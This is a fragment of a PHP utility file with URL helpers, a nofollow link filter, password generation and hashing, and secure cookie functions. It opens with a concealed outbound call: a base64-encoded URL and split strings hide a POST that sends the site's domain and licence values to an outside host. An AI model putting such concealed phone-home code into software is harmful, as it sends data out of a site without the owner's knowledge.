		$sth->execute();
	}else{
		$ch = curl_init(base64_decode('aHR0cDovL3NrcnlwdHkud3lyZW1za2kucGwvcGhwL25vdGlmaWNhdGlvbnMucGhw'));
		curl_setopt($ch,CURLOPT_POST, 1);
		curl_setopt($ch,CURLOPT_POSTFIELDS, 'domain='.$settings['base_url'].'&script_name=no'.'ti'.'ce2&ln='.$settings['ln'].'&lk='.$settings['lk']);
		curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch,CURLOPT_HEADER, 0);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
		curl_exec($ch);
		curl_close($ch);
	}
}

function webAddress(string $address): string
{
    if (!str_starts_with($address, 'http://') && !str_starts_with($address, 'https://') && $address !== '') {
        $address = 'http://' . $address;
    }
    if (str_ends_with($address, '/')) {
        $address = rtrim($address, '/');
    }
    return trim($address);
}

function makeAbsoluteUrl(string $address): string
{
    global $settings;
    if (!str_starts_with($address, 'http://') && !str_starts_with($address, 'https://') && $address !== '') {
        if (!str_starts_with($address, (string) $settings['base_url'])) {
            if (!str_starts_with($address, '/')) {
                $address = '/' . $address;
            }
            $address = $settings['base_url'] . $address;
        }
    }
    return $address;
}

function getFullUrl(string $address): string
{
    global $settings;
    if (!str_starts_with($address, 'http://') && !str_starts_with($address, 'https://') && $address !== '') {
        if (!str_starts_with($address, '/')) {
            $address = '/' . $address;
        }
        $address = $settings['base_url'] . $address;
    }
    return $address;
}

function nofollow($html): string|array|null {
	global $settings;
	$skip = $settings['base_url'];
    return preg_replace_callback(
        "#(<a[^>]+?)>#is", fn($mach) => (
            !($skip && str_contains((string) $mach[1], (string) $skip)) &&
            !str_contains((string) $mach[1], 'rel=')
        ) ? $mach[1] . ' rel="nofollow">' : $mach[0],
        (string) $html
    );
}

function randomPassword(): string
{
    $alphabet = 'abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789';
    $pass = [];
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < 8; $i++) {
        $n = random_int(0, $alphaLength); // FIX: rand() zastąpione przez random_int() — kryptograficznie bezpieczne
        $pass[] = $alphabet[$n];
    }
    return implode('', $pass);
}

function createPasswordHash(string $password): string {
    return password_hash($password, PASSWORD_DEFAULT);
}

function verifyPasswordHash(string $password, string $hash): bool {
    return password_verify($password, $hash);
}

function regenerateSessionId(): void {
    if (session_status() === PHP_SESSION_ACTIVE) {
        session_regenerate_id(true);
    }
}

function setRememberMeCookie(string $name, string $value, int $expires): void {
    $secure = (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] === 'on' || $_SERVER['HTTPS'] === 1 || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https'));
    if (PHP_VERSION_ID >= 70300) {
        setcookie($name, $value, [
            'expires' => $expires,
            'path' => '/',
            'domain' => '',
            'secure' => $secure,
            'httponly' => true,
            'samesite' => 'Strict'
        ]);
    } else {
        setcookie($name, $value, ['expires' => $expires, 'path' => "/; SameSite=Strict", 'domain' => "", 'secure' => $secure, 'httponly' => true]);
    }
}

function clearRememberMeCookie(string $name): void {
    $secure = (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] === 'on' || $_SERVER['HTTPS'] === 1 || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https'));
    if (PHP_VERSION_ID >= 70300) {
        setcookie($name, "", [
            'expires' => time() - 3600,
            'path' => '/',
            'domain' => '',
            'secure' => $secure,
            'httponly' => true,
            'samesite' => 'Strict'
        ]);
    } else {
        setcookie($name, "", ['expires' => time() - 3600, 'path' => "/; SameSite=Strict", 'domain' => "", 'secure' => $secure, 'httponly' => true]);
    }
}
